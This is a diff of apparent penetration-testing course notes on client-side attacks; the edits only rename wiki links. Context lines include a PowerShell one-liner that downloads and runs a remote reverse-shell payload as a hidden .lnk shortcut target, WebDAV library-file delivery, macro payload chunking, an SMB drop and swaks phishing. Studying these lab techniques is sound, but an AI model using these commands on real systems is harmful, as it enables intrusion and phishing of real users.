@@ -13,7 +13,7 @@ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
 ```
 *`--auth=anonymous` disables credential prompts entirely, `--port=80` matches what a library file's `url` tag expects over plain HTTP.*
 
-See [[Client-Side Attacks#Step 1: Set up a WebDAV share on Kali with WsgiDAV|12.3.1, Step 1]].
+See [[12. Client-Side Attacks#Step 1: Set up a WebDAV share on Kali with WsgiDAV|12.3.1, Step 1]].
 
 #### Tags: #WsgiDAV #WebDAV #ClientSideAttacks
 
@@ -44,7 +44,7 @@ See [[Client-Side Attacks#Step 1: Set up a WebDAV share on Kali with WsgiDAV|12.
 ```
 Save as `config.Library-ms` (or any name). **Reset to this exact original after every test-open**, Windows rewrites the `url` tag on first use.
 
-See [[Client-Side Attacks#Step 2: Build the Windows library file's XML|12.3.1, Step 2]], tag-by-tag meaning in [[Client-Side Attacks (Breakdowns)|Command Breakdowns]].
+See [[12. Client-Side Attacks#Step 2: Build the Windows library file's XML|12.3.1, Step 2]], tag-by-tag meaning in [[Client-Side Attacks (Breakdowns)|Command Breakdowns]].
 
 #### Tags: #LibraryMs #WindowsLibraryFiles #XML #ClientSideAttacks
 
@@ -57,7 +57,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<
 ```
 Set as a new shortcut's target (right-click desktop → New → Shortcut). Pad with a delimiter + benign command past 255 characters to hide it from a casual Properties check (target field holds up to 4096).
 
-See [[Client-Side Attacks#Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)|12.3.1, Step 4]], PowerCat delivery mechanics in [[Shells & Payloads (Breakdowns)|Command Breakdowns]].
+See [[12. Client-Side Attacks#Step 4: Build the `.lnk` shortcut payload (the actual reverse-shell trigger)|12.3.1, Step 4]], PowerCat delivery mechanics in [[Shells & Payloads (Breakdowns)|Command Breakdowns]].
 
 #### Tags: #LNKShortcut #PowerCat #ClientSideAttacks
 
@@ -70,7 +70,7 @@ Get-Item -Path .\<file> -Stream Zone.Identifier
 ```
 *Returns the file's `Zone.Identifier` Alternate Data Stream if MOTW is present, e.g. `[ZoneTransfer]\nZoneId=3` (`3` = Internet zone). Windows tags anything that arrived over a network connection this way, including content delivered through a library file's WebDAV share, even though Explorer visually renders that content as an ordinary local folder. MOTW is implemented as an NTFS ADS specifically, so it can't attach to anything on a FAT32-formatted device, no mechanism for the tag to exist on.*
 
-See [[Client-Side Attacks#Lab 2: True/false, is the `.lnk` file MOTW-tagged when executed by double-clicking the library file in Explorer?|12.3, Lab 2]].
+See [[12. Client-Side Attacks#Lab 2: True/false, is the `.lnk` file MOTW-tagged when executed by double-clicking the library file in Explorer?|12.3, Lab 2]].
 
 #### Tags: #MOTW #ZoneIdentifier #NTFSAlternateDataStream #ClientSideAttacks
 
@@ -106,7 +106,7 @@ for i in range(0, len(s), 50):
 "
 ```
 
-See [[Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]], chunking-and-encoding mechanics in [[Shells & Payloads (Breakdowns)|Command Breakdowns]].
+See [[12. Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]], chunking-and-encoding mechanics in [[Shells & Payloads (Breakdowns)|Command Breakdowns]].
 
 #### Tags: #VBA #WordMacros #ClientSideAttacks
 
@@ -121,7 +121,7 @@ xfreerdp /v:<target_ip> /u:offsec /p:lab /dynamic-resolution +clipboard /drive:k
 
 > **Gotcha:** even with `+clipboard` enabled, just *highlighting* text with the mouse on Linux only populates the **PRIMARY** selection (middle-click paste), which FreeRDP does **not** sync. Only an explicit **Ctrl+C** copy (or a clipboard tool like `xclip -selection clipboard`) populates the actual CLIPBOARD selection that gets forwarded into the RDP session.
 
-See [[Client-Side Attacks#🔁 Lab 1 Rebuild (fresh instance, after prior OFFICE VM corruption)|Client-Side Attacks, Lab 1 Rebuild]].
+See [[12. Client-Side Attacks#🔁 Lab 1 Rebuild (fresh instance, after prior OFFICE VM corruption)|Client-Side Attacks, Lab 1 Rebuild]].
 
 #### Tags: #Xfreerdp #ClipboardRedirection #DriveRedirection #ClientSideAttacks
 
@@ -135,7 +135,7 @@ smbclient //<target_ip>/share -c 'put ticket.doc'
 ```
 *`-c '<command>'` runs a single command non-interactively instead of dropping into an interactive `smb: \>` prompt, useful for scripting a one-shot delivery.*
 
-See [[Client-Side Attacks#Step 6: Full delivery to a target (HR137, via a simulated email/SMB drop)|12.3.1, Step 6]].
+See [[12. Client-Side Attacks#Step 6: Full delivery to a target (HR137, via a simulated email/SMB drop)|12.3.1, Step 6]].
 
 #### Tags: #Smbclient #SMB #ClientSideAttacks
 
@@ -166,7 +166,7 @@ sudo swaks \
 
 > 🔧 Technique: Always send to ALL discovered usernames even if you're not sure they have mailboxes. The SMTP `550 Unknown user` response is itself useful intelligence — it tells you exactly who does and doesn't have an email account.
 
-See [[Assembling the Pieces#27.3.2 Phishing — Windows Library File + Shortcut]].
+See [[27. Assembling the Pieces#27.3.2 Phishing — Windows Library File + Shortcut|Assembling the Pieces#27.3.2 Phishing — Windows Library File + Shortcut]].
 
 #### Tags: #Swaks #SMTP #Phishing #ClientSideAttacks #EmailDelivery
 
